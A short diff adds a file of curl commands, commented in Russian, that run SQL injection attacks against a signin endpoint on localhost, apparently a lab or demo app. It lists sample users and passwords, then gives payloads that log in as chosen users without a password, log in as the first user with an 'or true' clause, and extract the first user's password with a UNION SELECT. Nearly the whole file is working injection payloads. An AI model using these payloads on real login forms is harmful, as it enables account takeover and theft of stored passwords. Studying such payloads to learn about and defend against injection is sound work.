@@ -1,0 +1,21 @@
+# Пользователи бд
+# (name:pass:banned):
+# u1:p1:true
+# u2:p2:false
+
+# SQLi
+# Зайти под пользоателем u2 без пароля:
+curl -X POST -d "name=u2' --" -d "pass=kk" -d "banned=false" http://localhost:8080/signin
+
+# Зайти под пользоателем u1 без пароля:
+curl -X POST -d "name=u1' --" -d "pass=kk" -d "banned=false" http://localhost:8080/signin
+
+# С использованием закодированной кавычки
+curl -X POST -d "name=u2%27 --" -d "pass=kk" -d "banned=false" http://localhost:8080/signin
+
+# Зайти под первым пользователем в бд:
+curl -X POST -d "name=1%27 or true --" -d "pass=kk" -d "banned=false" http://localhost:8080/signin
+
+# Узанть пароль первого пользователя бд:
+curl -X POST -d "name=1%27 union select (select min(pass) from users) order by 1 asc limit 1--" -d "pass=xexe" -d "banned=false" http://localhost:8080/signin
+
